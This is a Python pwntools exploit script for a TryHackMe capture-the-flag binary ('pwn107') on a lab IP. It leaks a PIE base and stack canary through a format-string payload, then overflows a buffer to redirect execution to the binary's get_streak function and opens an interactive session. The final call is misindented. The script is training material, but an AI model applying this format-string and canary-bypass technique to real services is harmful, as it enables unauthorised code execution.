from pwn import *
import traceback as tb

RHOST="10.10.103.95"
RPORT= 9007
local = False
filePath = "./pwn107.pwn107" 

def access(local = False):
    global RPORT, RHOST, filePath
    p = process(filePath) if local else remote(RHOST,RPORT)
    return p
  
def pwn107():
    global filePath, local
    try:
       binary = context.binary = ELF(filePath, checksec=False)    
       p = access(local)

       payload = b""
       payload += b"%11$p %13$p"

       p.sendlineafter(b"What's your last streak? ", payload)

       p.recvuntil(b"Your current streak: ")
       result = [int(x,16) for x in p.recvline().split()]

       image_base = result[0] - 0x780
       canary = result[1]

       payload = b""
       payload += 0x18 * b"A"
       payload += p64(canary)
       payload += 0x8 * b"A"
       payload += p64(binary.sym.get_streak + image_base + 1)

       p.clean()
       p.sendline(payload)
       p.interactive()    
    except:
       tb.print_exc()
        
  pwn107()

"""
Original pwn107 Sources: https://github.com/D13David/ctf-writeups/blob/main/tryhackme/pwn101/exploit107.py
Description:
Modded in the form of the other pwn101's I've been doing/ formatting... Defines an ELF binary w.r.t. the standard access, and "pwn10x"
formula thus far...

"""
